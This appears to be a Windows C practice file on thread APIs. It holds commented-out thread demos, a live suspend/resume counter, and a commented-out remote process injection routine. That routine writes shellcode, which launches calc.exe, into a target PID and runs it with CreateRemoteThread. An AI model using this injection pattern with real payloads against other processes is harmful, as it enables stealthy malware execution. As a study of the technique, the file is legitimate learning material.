#include <windows.h>
#include <stdio.h>


// typedef struct {
//     int id;
//     int iters;
// } WorkerArgs, * PWorkerArgs;

// DWORD WINAPI worker( LPVOID p ) {

//     PWorkerArgs W = ( PWorkerArgs )p;
//     for ( int i = 0; i < W->iters; i++ ) {
//         printf( "  worker %d iter %d/%d\n", W->id, i + 1, W->iters );
//         Sleep( 100 + W->id * 50 );
//     }
//     return ( DWORD )( W->id * 100 + W->iters );
// }

// int main() {
//     WorkerArgs args[ 3 ] = {
//         { 1, 5 },
//         { 2, 3 },
//         { 3, 4 }
//     };

//     HANDLE threads[ 3 ];
//     for ( int i = 0; i < 3; i++ ) {
//         threads[ i ] = CreateThread( NULL, 0, worker, &args[ i ], 0, NULL );
//         if ( !threads[ i ] ) {
//             fprintf( stderr, "[!] CreateThread falied with error: %lu", GetLastError() );
//             return 1;
//         }
//     }

//     WaitForMultipleObjects( 3, threads, TRUE, INFINITE );

//     for ( int i = 0; i < 3; i++ ) {

//         DWORD Code = 0;
//         GetExitCodeThread( threads[ i ], &Code );
//         printf( "[+] worker %d exit code = %lu\n", args[ i ].id, Code );
//         CloseHandle( threads[ i ] );
//     }
//     return 0;
// }


// unsigned char buf[] =
// "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
// "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
// "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
// "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
// "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
// "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
// "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
// "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
// "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
// "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
// "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
// "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
// "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
// "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
// "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
// "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
// "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
// "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
// "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
// "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

// int main( int argc, char* argv[] ) {

//     if ( argc < 2 ) {
//         fprintf( stderr, "Usage: %s <pid>\n", argv[ 0 ] );
//         return 1;
//     }

//     DWORD pid = atoi( argv[ 1 ] );

//     HANDLE hProcess = OpenProcess( PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, pid );
//     if ( !hProcess ) {
//         fprintf( stderr, "[!] OpenProcess failed with error: %lu\n", GetLastError() );
//         return 1;
//     }


//     LPVOID exec_mem = VirtualAllocEx( hProcess, NULL, sizeof( buf ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
//     if ( !exec_mem ) {
//         fprintf( stderr, "[!] VirtualAllocEx failed with error: %lu\n", GetLastError() );
//         return 1;
//     }
//     printf( "[+] Allocated memory at %p\n", exec_mem );

//     SIZE_T bytesWritten = 0;
//     if ( !WriteProcessMemory( hProcess, exec_mem, buf, sizeof( buf ), &bytesWritten ) ) {
//         fprintf( stderr, "[!] WriteProcessMemory failed with error: %lu\n", GetLastError() );
//         return 1;
//     }

//     DWORD oldProtection;
//     if ( !VirtualProtectEx( hProcess, exec_mem, sizeof( buf ), PAGE_EXECUTE_READ, &oldProtection ) ) {
//         fprintf( stderr, "[!] VirtualProtectEx failed with error: %lu\n", GetLastError() );
//         return 1;
//     }

//     DWORD threadId = 0;
//     HANDLE hThread = CreateRemoteThread( hProcess, NULL, 0, ( LPTHREAD_START_ROUTINE )exec_mem, NULL, 0, &threadId );
//     if ( !hThread ) {
//         fprintf( stderr, "[!] CreateRemoteThread failed with error: %lu\n", GetLastError() );
//         return 1;
//     }
//     printf( "[+] Created remote thread with ID %lu\n", threadId );


//     WaitForSingleObject( hThread, INFINITE );
//     DWORD Code = 0;
//     GetExitCodeThread( hThread, &Code );
//     printf( "[+] Remote Thread exit code = %lu\n", Code );

//     CloseHandle( hThread );
//     VirtualFreeEx( hThread, exec_mem, 0, MEM_RELEASE );
//     CloseHandle( hProcess );

//     return 0;
// }


DWORD WINAPI Counter( LPVOID p ) {
    int* out = ( int* )p;
    for ( int i = 0; i < 20; i++ ) {
        printf( "  counter: %d\n", i );
        ( *out )++;
        Sleep( 200 );
    }
    return 0;
}

int main( void ) {

    int value = 0;
    HANDLE hThread = CreateThread( NULL, 0, Counter, &value, 0, NULL );

    Sleep( 1000 );
    SuspendThread( hThread );
    printf( "[+] Suspended at counter=%d\n", value );

    Sleep( 2000 );
    int before = value;
    printf( "[+] Still suspended, value didn't change: %d == %d\n", value, before );

    ResumeThread( hThread );
    printf( "[+] Resumed" );

    WaitForSingleObject( hThread, INFINITE );
    CloseHandle( hThread );
    printf( "[+] Final Value = %d\n", value );
    return 0;
}